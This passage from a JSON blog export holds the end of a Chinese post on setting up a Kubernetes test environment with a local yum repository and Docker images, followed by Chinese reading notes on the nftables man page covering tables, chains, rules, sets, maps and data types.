rpm\u5305\u548cdocker\u955c\u50cf\u653e\u5230/data/k8s-deploy\u76ee\u5f55\uff0c\u5176\u4e2drpms\u76ee\u5f55\u5b58\u653e\u4e86\u9700\u8981\u7528\u5230\u7684rpm\u5305\uff0cimages\u76ee\u5f55\u5b58\u653e\u9700\u8981\u7528\u5230\u7684docker\u955c\u50cf\uff0c\u56e0\u539f\u811a\u672c\u4e2d\u4e0d\u5305\u542bk8s dashboard\uff08\u4e00\u5957web ui\u7ba1\u7406\u754c\u9762\uff09\uff0c\u4e3a\u4e86\u80fd\u591f\u90e8\u7f72dashboard\uff0c\u5bf9\u539f\u811a\u672c\u4f5c\u4e86\u4fee\u6539\u589e\u52a0\u4e86\u90e8\u7f72dashboard\u7684\u9009\u9879\uff0c\u90e8\u7f72dashboard\u9700\u8981\u4e00\u4e9b\u989d\u5916\u7684docker\u955c\u50cf\u548c\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u91cc\u5148\u8865\u5145\u597ddocker\u955c\u50cf\uff1a\\n```\\nyum -y install docker\\nsystemctl start docker\\ndocker pull googlecontainer/kubernetes-dashboard-amd64:v1.6.1\\ndocker pull googlecontainer/heapster-influxdb-amd64:v1.1.1\\ndocker pull googlecontainer/heapster-grafana-amd64:v4.0.2\\ndocker pull googlecontainer/heapster-amd64:v1.3.0\\ncd /data/k8s-deploly/images\\ndocker save googlecontainer/kubernetes-dashboard-amd64 -o kubernetes-dashboard-amd64_v1.6.1.tar\\ndocker save googlecontainer/heapster-influxdb-amd64 -o heapster-influxdb-amd64_v1.1.1.tar\\ndocker save googlecontainer/heapster-grafana-amd64 -o heapster-grafana-amd64_v4.0.2.tar\\ndocker save googlecontainer/heapster-amd64 -o heapster-amd64_v1.3.0.tar\\n```\\n\\n\u539f\u811a\u672c\u4e2d\u5b89\u88c5rpm\u5305\u662f\u5728\u5404\u8282\u70b9\u4e0b\u8f7d\u597d\u540e\u672c\u5730\u5b89\u88c5\u7684\uff0c\u6211\u6539\u8fdb\u4e86\u4e00\u4e0b\u91c7\u7528yum\u65b9\u5f0f\u5b89\u88c5\uff0c\u51c6\u5907yum\u4ed3\u5e93\uff1a\\n```\\ncreaterepo /data/k8s-deploy/rpms\\nyum -y install nginx\\ncat >/etc/nginx/conf.d/k8srepo.conf <<EOF\\nserver {\\n    listen       8000;\\n    server_name  _;\\n    root         /data/k8s-deploy;\\n    autoindex on;\\n\\n    location / {\\n        autoindex on;\\n    }\\n}\\nEOF\\nsystemctl restart nginx\\n```\\n\u81f3\u6b64yum repo\u548cdocker\u955c\u50cf\u51c6\u5907\u5b8c\u6210\u3002\\n\\n## \u90e8\u7f72k8s\u96c6\u7fa4\\n\\n\u90e8\u7f72\u8fc7\u7a0b\u53c2\u8003https://github.com/5xops/k8s-deploy/blob/master/README.md \uff0c\u9700\u8981\u4fee\u6539repo\u4e2d\u7684k8slocal.repo\u6587\u4ef6\u4e2dip\u5730\u5740\u4e3ayum\u4ed3\u5e93\u5bf9\u5e94\u7684ip\u5730\u5740\uff0c\u90e8\u7f72master\u3001minion\u548creplica\u53ef\u53c2\u8003master.sh\uff0cminon.sh, replica.sh\u7684\u5185\u5bb9\u3002\\n\u9700\u8981\u6ce8\u610f\u7684\u662f\u4e3a\u4e86\u90e8\u7f72dashboard\u670d\u52a1\u6211\u4eec\u989d\u5916\u589e\u52a0\u4e86dashboard\u76f8\u5173\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5177\u4f53\u589e\u52a0\u7684\u5185\u5bb9\u8bf7\u53c2\u8003\u8fd9\u4e2acommit\uff1a https://github.com/5xops/k8s-deploy/commit/1766a675d76edb32f310acd98d5c6ed50a356e5b\\n\\n\\n\u81f3\u6b64\uff0ck8s\u6d4b\u8bd5\u73af\u5883\u53ca\u642d\u5efa\u5b8c\u6210\uff0c\u540e\u7eed\u6211\u5c06\u4f7f\u7528\u8fd9\u4e2ak8s\u6d4b\u8bd5\u73af\u5883\u6765\u90e8\u7f72\u5176\u4ed6\u670d\u52a1\uff0c\u540e\u9762\u4f1a\u6162\u6162\u5206\u4eab\u3002"},{"id":"/2017/06/13/nftables-man-page","metadata":{"permalink":"/notes/blog/2017/06/13/nftables-man-page","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2017-06-13-nftables-man-page.md","source":"@site/blog/2017-06-13-nftables-man-page.md","title":"nftables\uff1anft man\u6587\u6863\u9605\u8bfb\u7b14\u8bb0","description":"\u8fd9\u91cc\u662f\u4e00\u4efdnft man\u6587\u6863\u7b14\u8bb0","date":"2017-06-13T00:00:00.000Z","tags":[{"inline":true,"label":"nft","permalink":"/notes/blog/tags/nft"},{"inline":true,"label":"nftables","permalink":"/notes/blog/tags/nftables"}],"readingTime":36.32,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"nftables\uff1anft man\u6587\u6863\u9605\u8bfb\u7b14\u8bb0","description":"\u8fd9\u91cc\u662f\u4e00\u4efdnft man\u6587\u6863\u7b14\u8bb0","categories":["system"],"tags":["nft","nftables"]},"unlisted":false,"prevItem":{"title":"k8s\u6d4b\u8bd5\u73af\u5883\u90e8\u7f72\u8bb0\u5f55","permalink":"/notes/blog/2017/08/18/deploy-k8s-from-local-repo"},"nextItem":{"title":"\u5f00\u7bc7","permalink":"/notes/blog/2017/05/31/first-post"}},"content":"> \u5229\u7528\u7a7a\u95f2\u65f6\u95f4\u5b66\u4e60\u4e86nftables\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u5176\u4e2d\u5b98\u65b9\u7684man page\u4e2d\u5305\u542b\u4e86\u5927\u91cf\u4fe1\u606f\uff0c\u5728\u9605\u8bfb\u8fc7\u7a0b\u4e2d\u6574\u7406\u4e86\u4e00\u4efd\u5e26\u4e2d\u6587\u6ce8\u91ca\u7684\u7b14\u8bb0\uff0c\u4ee5\u8f85\u52a9\u52a0\u6df1\u8bb0\u5fc6\u3002\\n\\n\\n\\n## \u5de5\u5177\u540d\u79f0\\n\\nnft\xa0--\xa0 \u5305\u8fc7\u6ee4\u89c4\u5219\u7ba1\u7406\u5de5\u5177\\n\\n\\n\\n## \u57fa\u672c\u7528\u6cd5\\n\\n`nft [ -n | --numeric ] [ -s | --stateless ] [ [-I | --includepath] directory ] [ [-f | --file] filename | [-i | --interactive] | cmd ]`\\n\\n`nft [ -h | --help ] [ -v | --version ]`\\n\\n\\n## \u5de5\u5177\u63cf\u8ff0\\n\\nnftables \u4f5c\u4e3a\u65b0\u4e00\u4ee3\u7684\u9632\u706b\u5899\u7b56\u7565\u6846\u67b6\uff0c\u65e8\u5728\u66ff\u4ee3\u4e4b\u524d\u7684\u5404\u79cd\u9632\u706b\u5899\u5de5\u5177\u8bf8\u5982iptables/ebtables\u7b49\uff0c\u800c\u4e14\u63d0\u4f9b\u4e86\u7c7b\u4f3ctc\u7684\u5e26\u5bbd\u9650\u901f\u80fd\u529b\u3002\u800cnft\u5219\u63d0\u4f9b\u4e86nftables\u7684\u547d\u4ee4\u884c\u5165\u53e3\uff0c\u662f\u7528\u6237\u7a7a\u95f4\u7684\u7ba1\u7406\u5de5\u5177\u3002\\n\\n\\n\\n## \u9009\u9879\u8bf4\u660e\\n\\n\u6267\u884c`nft --help`\u67e5\u770b\u5b8c\u6574\u5e2e\u52a9\u4fe1\u606f\\n\\n\\n\\n`-h, --help`\\n\\n<dd>\\n\\n\\n\u67e5\u770b\u5e2e\u52a9\u4fe1\u606f.\\n\\n</dd>\\n\\n`-v, --version`\\n\\n<dd>\\n\\n\\n\u67e5\u770b\u7248\u672c\u53f7.\\n\\n</dd>\\n\\n`-n, --numeric`\\n\\n<dd>\\n\\n\u4ee5\u6570\u503c\u65b9\u5f0f\u5c55\u793a\u6570\u636e\uff0c\u53ef\u91cd\u590d\u4f7f\u7528\uff0c\u4e00\u4e2a-n\u8868\u793a\u4e0d\u89e3\u6790\u57df\u540d\uff0c\u7b2c\u4e8c\u6b21\u4e0d\u89e3\u6790\u7aef\u53e3\u53f7\uff0c\u7b2c\u4e09\u6b21\u4e0d\u89e3\u6790\u534f\u8bae\u548cuid/gid\u3002\\n\\n</dd>\\n\\n`-s, --stateless`\\n\\n<dd>\\n\\n\u7701\u7565\u89c4\u5219\u548c\u6709\u72b6\u6001\u5bf9\u8c61\u7684\u72b6\u6001\u4fe1\u606f\\n</dd>\\n\\n`-N`\\n\\n<dd>\\n\\n\u5c06ip\u5730\u5740\u89e3\u6790\u6210\u57df\u540d\uff0c\u4f9d\u8d56dns\u89e3\u6790\u3002\\n\\n</dd>\\n\\n`-a, --handle`\\n\\n<dd>\\n\\n\u8f93\u51fa\u5185\u5bb9\u4e2d\u5c55\u793a\u89c4\u5219handle\u4fe1\u606f\\n\\n</dd>\\n\\n`-I, --includepath directory`\\n\\n<dd>\\n\\n\u6dfb\u52a0include\u6587\u4ef6\u641c\u7d22\u76ee\u5f55\\n\\n</dd>\\n\\n`-f, --file filename`\\n\\n<dd>\\n\\n\u4ece\u6587\u4ef6\u83b7\u53d6\u8f93\u5165\\n\\n</dd>\\n\\n`-i, --interactive`\\n\\n<dd>\\n\\n\u4ece\u4ea4\u4e92\u5f0fcli\u83b7\u53d6\u8f93\u5165\\n\\n</dd>\\n\\n\\n\\n## \u6587\u4ef6\u683c\u5f0f\\n\\n\\n### \u8bed\u6cd5\u89c4\u5b9a\\n\\n\u5355\u884c\u8fc7\u957f\u53ef\u7528`\\\\`\u6362\u884c\u8fde\u63a5\uff1b\\n\u591a\u4e2a\u547d\u4ee4\u5199\u5230\u540c\u4e00\u884c\u53ef\u7528\u5206\u53f7`;` \u5206\u9694\uff1b\\n\u6ce8\u91ca\u4f7f\u7528\u4e95\u53f7`#`\u6253\u5934\uff1b\\n\u6807\u8bc6\u7b26\u7528\u5927\u5c0f\u5199\u5b57\u6bcd\u6253\u5934\uff0c\u540e\u9762\u8ddf\u6570\u5b57\u5b57\u6bcd\u4e0b\u5212\u7ebf\u6b63\u659c\u6760\u53cd\u659c\u6760\u4ee5\u53ca\u70b9\u53f7;\\n\u7528\u53cc\u5f15\u53f7\u5f15\u8d77\u6765\u8868\u793a\u7eaf\u5b57\u7b26\u4e32\u3002\\n\\n### \u6587\u4ef6\u5f15\u7528\\n\\n`include \\"filename\\"`\\n\\n\u53ef\u7531\u5916\u90e8\u6587\u4ef6\u901a\u8fc7`include`\u5bfc\u5165\u5230\u5f53\u524d\u6587\u4ef6\uff0c\u7528`-I/--includepath`\u6307\u5b9a\u5bfc\u5165\u6587\u4ef6\u6240\u5728\u76ee\u5f55\uff0c\u5982\u679cinclude\u540e\u9762\u63a5\u7684\u662f\u76ee\u5f55\u800c\u975e\u6587\u4ef6\uff0c\u5219\u6574\u4e2a\u76ee\u5f55\u7684\u6587\u4ef6\u5c06\u4ee5\u5b57\u6bcd\u987a\u5e8f\u4f9d\u6b21\u5bfc\u5165\u3002\\n\\n\\n\\n### \u7b26\u53f7\u53d8\u91cf\\n\\n`define variable = expr`\\n\\n`$variable`\\n\\nSymbolic variables can be defined using the ***define*** statement. Variable references are expressions and can be used initialize other variables. The scope of a definition is the current block and all blocks contained within.\\n\u53d8\u91cf\u4f7f\u7528`define`\u5b9a\u4e49\uff0c\u53d8\u91cf\u5f15\u7528\u5c5e\u4e8e\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u7528\u4e8e\u521d\u59cb\u5316\u5176\u4ed6\u53d8\u91cf\uff0c\u53d8\u91cf\u7684\u751f\u6548\u8303\u56f4\u5728\u5f53\u524dblock\u4ee5\u53ca\u88ab\u5305\u542b\u7684\u6240\u6709block\u5185\u3002\\n\\n\\n***\u793a\u4f8b 1. \u4f7f\u7528\u7b26\u53f7\u53d8\u91cf***\\n\\n~~~\\ndefine int_if1 = eth0\\ndefine int_if2 = eth1\\ndefine int_ifs = { $int_if1, $int_if2 }\\n\\nfilter input iif $int_ifs accept\\n~~~\\n\\n\\n## \u5730\u5740\u65cf\\n\\n\u6839\u636e\u5904\u7406\u7684\u5305\u7684\u79cd\u7c7b\u4e0d\u540c\u53ef\u4ee5\u5c06\u5176\u5206\u4e3a\u4e0d\u540c\u7684\u5730\u5740\u65cf\u3002\u4e0d\u540c\u7684\u5730\u5740\u65cf\u5728\u5185\u6838\u4e2d\u5305\u542b\u6709\u7279\u5b9a\u9636\u6bb5\u7684\u5904\u7406\u8def\u5f84\u548chook\u70b9\uff0c\u5f53\u5bf9\u5e94hook\u7684\u89c4\u5219\u5b58\u5728\u65f6\u5219\u4f1a\u88abnftables\u5904\u7406\u3002\u5177\u4f53\u7c7b\u578b\u5982\u4e0b\uff1a\\n\\n\\n`ip`\\n\\n<dd>\\n\\nIPv4 \u5730\u5740\u65cf\\n\\n</dd>\\n\\n`ip6`\\n\\n<dd>\\n\\nIPv6 \u5730\u5740\u65cf\\n\\n</dd>\\n\\n`inet`\\n\\n<dd>\\n\\nInternet (IPv4/IPv6) \u5730\u5740\u65cf\\n\\n</dd>\\n\\n`arp`\\n\\n<dd>\\n\\nARP \u5730\u5740\u65cf\\n\\n</dd>\\n\\n`bridge`\\n\\n<dd>\\n\\nBridge \u5730\u5740\u65cf\\n\\n</dd>\\n\\n`netdev`\\n\\n<dd>\\n\\nNetdev \u5730\u5740\u65cf\\n\\n</dd>\\n\\n\\n\u6240\u6709nftables\u5bf9\u8c61\u5b58\u5728\u4e8e\u7279\u5b9a\u7684\u5730\u5740\u65cfnamespace\u4e2d\uff0c\u6362\u8a00\u4e4b\u6240\u6709identifier\u90fd\u542b\u6709\u4e00\u4e2a\u7279\u5b9a\u7684\u5730\u5740\u65cf\uff0c\u5982\u679c\u672a\u6307\u5b9a\u5219\u9ed8\u8ba4\u4f7f\u7528`ip`\u5730\u5740\u65cf\\n### IPv4/IPv6/Inet address families\\n\\nIPv4/IPv6/Inet \u5730\u5740\u65cf\u7528\u4e8e\u5904\u7406 IPv4\u548cIPv6\u5305\uff0c\u5176\u5728network stack\u4e2d\u5728\u4e0d\u540c\u7684\u5305\u5904\u7406\u9636\u6bb5\u4e00\u5171\u5305\u542b\u4e865\u4e2ahook.\\n\\n***Table 1. IPv4/IPv6/Inet \u5730\u5740\u7c7bhook\u5217\u8868***\\n\\n| Hook\u540d\u79f0 | \u63cf\u8ff0 |\\n| --- | --- |\\n| prerouting | \u6240\u6709\u8fdb\u5165\u5230\u7cfb\u7edf\u7684\u5305\u90fd\u4f1a\u88abprerouting hook\u8fdb\u884c\u5904\u7406. \u5b83\u5728routing\u6d41\u7a0b\u4e4b\u524d\u5c31\u88ab\u53d1\u8d77\uff0c\u7528\u4e8e\u9760\u524d\u9636\u6bb5\u7684\u5305\u8fc7\u6ee4\u6216\u8005\u66f4\u6539\u5f71\u54cdrouting\u7684\u5305\u5c5e\u6027. |\\n| input | \u53d1\u5f80\u672c\u5730\u7cfb\u7edf\u7684\u5305\u5c06\u88abinput hook\u5904\u7406. |\\n| forward | \u88ab\u8f6c\u53d1\u5230\u5176\u4ed6\u4e3b\u673a\u7684\u5305\u4f1a\u7ecf\u7531forward hook\u5904\u7406. |\\n| output | \u7531\u672c\u5730\u8fdb\u7a0b\u53d1\u9001\u51fa\u53bb\u7684\u5305\u5c06\u88aboutput hook\u5904\u7406. |\\n| postrouting | \u6240\u6709\u79bb\u5f00\u7cfb\u7edf\u7684\u5305\u90fd\u5c06\u88abpostrouting hook\u5904\u7406. |\\n\\n\\n\\n### ARP address family\\n\\nARP\u5730\u5740\u65cf\u7528\u4e8e\u5904\u7406\u7ecf\u7531\u7cfb\u7edf\u63a5\u6536\u548c\u53d1\u9001\u7684ARP\u5305\u3002\u4e00\u822c\u5728\u96c6\u7fa4\u73af\u5883\u4e2d\u5bf9ARP\u5305\u8fdb\u884cmangle\u5904\u7406\u4ee5\u652f\u6301clustering\u3002\\n\\n\\n***Table 2. ARP address family hooks***\\n\\n| Hook | \u63cf\u8ff0 |\\n| --- | --- |\\n| input | \u5206\u53d1\u5230\u672c\u673a\u7684\u5305\u4f1a\u7ecf\u8fc7input hook. |\\n| output | \u7531\u672c\u673a\u53d1\u51fa\u7684\u5305\u4f1a\u7ecf\u8fc7output hook. |\\n\\n\\n\\n### Bridge address family\\n\\nbridge\u5730\u5740\u65cf\u5904\u7406\u901a\u8fc7\u6865\u63a5\u8bbe\u5907\u7684ethernet\u5305\u3002\\n\\n\\n\\n### Netdev address family\\n\\nNetdev\u5730\u5740\u65cf\u5904\u7406\u4eceingress\u8fc7\u6765\u7684\u5305\u3002\\n\\n\\n***Table 3. Netdev address family hooks***\\n\\n| Hook | Description |\\n| --- | --- |\\n| ingress | \u6240\u6709\u8fdb\u5165\u7cfb\u7edf\u7684\u5305\u90fd\u5c06\u88abingress hook\u5904\u7406\u3002\u5b83\u5728\u8fdb\u5165layer 3\u4e4b\u524d\u7684\u9636\u6bb5\u5c31\u5f00\u59cb\u5904\u7406\u3002|\\n\\n\\n\\n## Tables\\n\\n`{add | delete | list | flush} table [family] {table}`\\n\\ntable\u662fchain/set/stateful object\u7684\u5bb9\u5668\uff0ctable\u7531\u5176\u5730\u5740\u65cf\u548c\u540d\u5b57\u505a\u6807\u8bc6\u3002\u5730\u5740\u65cf\u5fc5\u987b\u5c5e\u4e8eip, ip6, arp, bridge, netdev\u4e2d\u7684\u4e00\u79cd\uff0cinet\u5730\u5740\u65cf\u662f\u4e00\u4e2a\u865a\u62df\u5730\u5740\u65cf\uff0c\u540c\u6765\u521b\u5efa\u540c\u65f6\u5305\u542bIPv4\u548cIPv6\u7684table\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u5730\u5740\u65cf\u5219\u9ed8\u8ba4\u4f7f\u7528`ip`\u5730\u5740\u65cf\u3002\\n\\n\\n`add`\\n\\n<dd>\\n\\n\u6dfb\u52a0\u6307\u5b9a\u5730\u5740\u65cf\uff0c\u6307\u5b9a\u540d\u79f0\u7684table\\n\\n</dd>\\n\\n`delete`\\n\\n<dd>\\n\\n\u5220\u9664\u6307\u5b9a\u7684table\\n\\n</dd>\\n\\n`list`\\n\\n<dd>\\n\\n\u5217\u51fa\u6307\u5b9atable\u4e2d\u7684\u6240\u6709chain\u548crule\\n\\n</dd>\\n\\n`flush`\\n\\n<dd>\\n\\n\u6e05\u9664\u6307\u5b9atable\u4e2d\u7684\u6240\u6709chain\u548crule\\n\\n</dd>\\n\\n\\n\\n## Chains\\n\\n`{add} chain [family] {table} {chain} {hook} {priority} {policy} {device}`\\n\\n`{add | create | delete | list | flush} chain [family] {table} {chain}`\\n\\n`{rename} chain [family] {table} {chain} {newname}`\\n\\nchain\u662frule\u7684\u5bb9\u5668\uff0c\u4ed6\u4eec\u5b58\u5728\u4e8e\u4e24\u79cd\u7c7b\u578b\uff0c\u57fa\u7840\u94fe\uff08base chain\uff09\u548c\u5e38\u89c4\u94fe\uff08regular chain\uff09\u3002base chain\u662f\u7f51\u7edc\u6808\u4e2d\u6570\u636e\u5305\u7684\u5165\u53e3\u70b9\uff0cregular chain\u5219\u53ef\u7528\u4e8ejump\u7684\u76ee\u6807\u5e76\u5bf9\u89c4\u5219\u8fdb\u884c\u66f4\u597d\u5730\u7ec4\u7ec7\u3002\\n\\n\\n`add`\\n\\n<dd>\\n\\n\u5728\u6307\u5b9atable\u4e2d\u6dfb\u52a0\u65b0\u7684\u94fe\uff0c\u5f53hook\u548c\u6743\u91cd\u503c\u88ab\u6307\u5b9a\u65f6\uff0c\u6dfb\u52a0\u7684chain\u4e3abase chain\uff0c\u5c06\u5728\u7f51\u7edc\u6808\u4e2dhook\u76f8\u5173\u8054\u3002\\n\\n</dd>\\n\\n`create`\\n\\n<dd>\\n\\n\u4e0e`add`\u547d\u4ee4\u7c7b\u4f3c\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5f53\u521b\u5efa\u7684chain\u5b58\u5728\u65f6\u4f1a\u8fd4\u56de\u9519\u8bef\u3002\\n\\n</dd>\\n\\n`delete`\\n\\n<dd>\\n\\n\u5220\u9664\u6307\u5b9a\u7684chain\uff0c\u88ab\u5220\u9664\u7684chain\u4e0d\u80fd\u6709\u89c4\u5219\u4e14\u4e0d\u80fd\u662f\u8df3\u8f6c\u76ee\u6807chain\u3002\\n\\n</dd>\\n\\n`rename`\\n\\n<dd>\\n\\n\u91cd\u547d\u540dchain\\n\\n</dd>\\n\\n`list`\\n\\n<dd>\\n\\n\u5217\u51fa\u6307\u5b9achain\u4e2d\u7684\u6240\u6709rule\\n\\n</dd>\\n\\n`flush`\\n\\n<dd>\\n\\n\u6e05\u9664\u6307\u5b9achain\u4e2d\u6240\u6709rule\\n\\n</dd>\\n\\n\\n## Rules\\n\\n`[add | insert] rule [family] {table} {chain} [position position] {statement...}`\\n\\n`{delete} rule [family] {table} {chain} {handle handle}`\\n\\nRules are constructed from two kinds of components according to a set of grammatical rules: expressions and statements.\\n\\n\\n`add`\\n\\n<dd>\\n\\nAdd a new rule described by the list of statements. The rule is appended to the given chain unless a position is specified, in which case the rule is appended to the rule given by the position.\\n\\n</dd>\\n\\n`insert`\\n\\n<dd>\\n\\nSimilar to the ***add*** command, but the rule is prepended to the beginning of the chain or before the rule at the given position.\\n\\n</dd>\\n\\n`delete`\\n\\n<dd>\\n\\nDelete the specified rule.\\n\\n</dd>\\n\\n\\n## Sets\\n\\n`{add} set family] {table} {set}{ {type} [flags] [timeout] [gc-interval] [elements] [size] [policy]}`\\n\\n`{delete | list | flush} set [family] {table} {set}`\\n\\n`{add | delete} element [family] {table} {set}{ {elements}}`\\n\\nSets are elements containers of an user-defined data type, they are uniquely identified by an user-defined name and attached to tables.\\nsets \u662f\u7528\u6237\u5b9a\u4e49\u7684\u6570\u636e\u7c7b\u578b\u7684\u5bb9\u5668\uff0c\u5177\u6709\u7528\u6237\u5b9a\u4e49\u7684\u552f\u4e00\u6807\u8bc6\uff0c\u88ab\u5e94\u7528\u5230table\u4e0a\u3002\\n\\n\\n`add`\\n\\n<dd>\\n\\n\u5728\u6307\u5b9a\u7684table\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684set\\n\\n</dd>\\n\\n`delete`\\n\\n<dd>\\n\\n\u5220\u9664\u6307\u5b9aset\\n\\n</dd>\\n\\n`list`\\n\\n<dd>\\n\\n\u67e5\u770bset\u5185\u7684\u5143\u7d20\\n</dd>\\n\\n`flush`\\n\\n<dd>\\n\\n\u6e05\u7a7a\u6574\u4e2aset\\n\\n</dd>\\n\\n`add element`\\n\\n<dd>\\n\\n\u5f80set\u4e2d\u6dfb\u52a0\u5143\u7d20\uff0c\u591a\u4e2a\u4f7f\u7528\u9017\u53f7\u5206\u9694\\n\\n</dd>\\n\\n`delete element`\\n\\n<dd>\\n\\n\u4eceset\u4e2d\u5220\u9664\u5143\u7d20\uff0c\u591a\u4e2a\u4f7f\u7528\u9017\u53f7\u5206\u9694\\n\\n</dd>\\n\\n\\n\\n***Table 4. Set \u53c2\u6570***\\n\\n| \u5173\u952e\u5b57 | \u63cf\u8ff0 | \u7c7b\u578b |\\n| --- | --- | --- |\\n| type | \u5143\u7d20\u7684\u6570\u636e\u7c7b\u578b | string: ipv4_addr, ipv6_addr, ether_addr, inet_proto, inet_service, mark |\\n| flags | set flags | string: constant, interval, timeout |\\n| timeout | \u5143\u7d20\u5728set\u4e2d\u7684\u5b58\u6d3b\u65f6\u95f4 | string, \u5e26\u5355\u4f4d\u7684\u5c0f\u6570. \u5355\u4f4d: d, h, m, s |\\n| gc-interval | \u5783\u573e\u56de\u6536\u95f4\u9694, \u4ec5\u5f53timeout\u6216flag timeout\u8bbe\u7f6e\u65f6\u751f\u6548 | string, decimal followed by unit. Units are: d, h, m, s |\\n| elements | set\u4e2d\u5305\u542b\u7684\u5143\u7d20 | set data type |\\n| size | set\u53ef\u5b58\u653e\u7684\u6700\u5927\u5143\u7d20\u4e2a\u6570 | unsigned integer (64 bit) |\\n| policy | set policy | string: performance [default], memory |\\n\\n\\n\\n## Maps\\n\\n`{add} map [family] {table} {map}{ {type} [flags] [elements] [size] [policy]}`\\n\\n`{delete | list | flush} map [family] {table} {map}`\\n\\n`{add | delete} element [family] {table} {map}{ {elements}}`\\n\\nMaps store data based on some specific key used as input, they are uniquely identified by an user-defined name and attached to tables.\\n\\n\\n`add`\\n\\n<dd>\\n\\nAdd a new map in the specified table.\\n\\n</dd>\\n\\n`delete`\\n\\n<dd>\\n\\nDelete the specified map.\\n\\n</dd>\\n\\n`list`\\n\\n<dd>\\n\\nDisplay the elements in the specified map.\\n\\n</dd>\\n\\n`flush`\\n\\n<dd>\\n\\nRemove all elements from the specified map.\\n\\n</dd>\\n\\n`add element`\\n\\n<dd>\\n\\nComma-separated list of elements to add into the specified map.\\n\\n</dd>\\n\\n`delete element`\\n\\n<dd>\\n\\nComma-separated list of element keys to delete from the specified map.\\n\\n</dd>\\n\\n\\n\\n\\n***Table 5. Map specifications***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| type | data type of map elements | string \':\' string: ipv4_addr, ipv6_addr, ether_addr, inet_proto, inet_service, mark, counter, quota. Counter and quota can\'t be used as keys |\\n| flags | map flags | string: constant, interval |\\n| elements | elements contained by the map | map data type |\\n| size | maximun number of elements in the map | unsigned integer (64 bit) |\\n| policy | map policy | string: performance [default], memory |\\n\\n\\n\\n## Stateful objects\\n\\n`{add | delete | list | reset} type [family] {table} {object}`\\n\\nStateful objects are attached to tables and are identified by an unique name. They group stateful information from rules, to reference them in rules the keywords \\"type name\\" are used e.g. \\"counter name\\".\\n\\n\\n`add`\\n\\n<dd>\\n\\nAdd a new stateful object in the specified table.\\n\\n</dd>\\n\\n`delete`\\n\\n<dd>\\n\\nDelete the specified object.\\n\\n</dd>\\n\\n`list`\\n\\n<dd>\\n\\nDisplay stateful information the object holds.\\n\\n</dd>\\n\\n`reset`\\n\\n<dd>\\n\\nList-and-reset stateful object.\\n\\n</dd>\\n\\n\\n### Ct\\n\\n***ct*** ```{helper} {type} {type} {protocol} {protocol} [l3proto] [family]```\\n\\nCt helper is used to define connection tracking helpers that can then be used in combination with the \\"ct helper set\\" statement. type and protocol are mandatory, l3proto is derived from the table family by default, i.e. in the inet table the kernel will try to load both the ipv4 and ipv6 helper backends, if they are supported by the kernel.\\n\\n\\n***Table 6. conntrack helper specifications***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| type | name of helper type | quoted string (e.g. \\"ftp\\") |\\n| protocol | layer 4 protocol of the helper | string (e.g. tcp) |\\n| l3proto | layer 3 protocol of the helper | address family (e.g. ip) |\\n\\n\\n\\n***\u793a\u4f8b 2. defining and assigning ftp helper***\\n\\nUnlike iptables, helper assignment needs to be performed after the conntrack lookup has completed, for example with the default 0 hook priority.\\n\\n~~~\\ntable inet myhelpers {\\n  ct helper ftp-standard {\\n     type \\"ftp\\" protocol tcp\\n  }\\n  chain prerouting {\\n      type filter hook prerouting priority 0;\\n      tcp dport 21 ct helper set \\"ftp-standard\\"\\n  }\\n}\\n\\n~~~\\n\\n\\n### Counter\\n\\n***counter*** [packets bytes]\\n\\n\\n***Table 7. Counter specifications***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| packets | initial count of packets | unsigned integer (64 bit) |\\n| bytes | initial count of bytes | unsigned integer (64 bit) |\\n\\n\\n\\n\\n### Quota\\n\\n***quota*** [over | until] [used]\\n\\n\\n***Table 8. Quota specifications***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| quota | quota limit, used as the quota name | Two arguments, unsigned interger (64 bit) and string: bytes, kbytes, mbytes. \\"over\\" and \\"until\\" go before these arguments |\\n| used | initial value of used quota | Two arguments, unsigned interger (64 bit) and string: bytes, kbytes, mbytes |\\n\\n\\n\\n## Expressions\\n\\nExpressions represent values, either constants like network addresses, port numbers etc. or data gathered from the packet during ruleset evaluation. Expressions can be combined using binary, logical, relational and other types of expressions to form complex or relational (match) expressions. They are also used as arguments to certain types of operations, like NAT, packet marking etc.\\n\\nEach expression has a data type, which determines the size, parsing and representation of symbolic values and type compatibility with other expressions.\\n\\n\\n### describe command\\n\\n`describe {expression}`\\n\\nThe ***describe*** command shows information about the type of an expression and its data type.\\n\\n\\n\\n***\u793a\u4f8b 3. The `describe` command***\\n\\n~~~\\n$ nft describe tcp flags\\npayload expression, datatype tcp_flag (TCP flag) (basetype bitmask, integer), 8 bits\\n\\npre-defined symbolic constants:\\nfin                               0x01\\nsyn                               0x02\\nrst                               0x04\\npsh                               0x08\\nack                               0x10\\nurg                               0x20\\necn                               0x40\\ncwr                               0x80\\n\\n~~~\\n\\n\\n\\n## Data types\\n\\nData types determine the size, parsing and representation of symbolic values and type compatibility of expressions. A number of global data types exist, in addition some expression types define further data types specific to the expression type. Most data types have a fixed size, some however may have a dynamic size, f.i. the string type.\\n\\nTypes may be derived from lower order types, f.i. the IPv4 address type is derived from the integer type, meaning an IPv4 address can also be specified as an integer value.\\n\\nIn certain contexts (set and map definitions) it is necessary to explicitly specify a data type. Each type has a name which is used for this.\\n\\n\\n### Integer type\\n\\n\\n***Table 9.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| Integer | integer | variable | - |\\n\\n\\nThe integer type is used for numeric values. It may be specified as decimal, hexadecimal or octal number. The integer type doesn\'t have a fixed size, its size is determined by the expression for which it is used.\\n\\n\\n### Bitmask type\\n\\n\\n***Table 10.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| Bitmask | bitmask | variable | integer |\\n\\n\\nThe bitmask type (***bitmask***) is used for bitmasks.\\n\\n\\n\\n### String type\\n\\n\\n***Table 11.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| String | string | variable | - |\\n\\n\\nThe string type is used to for 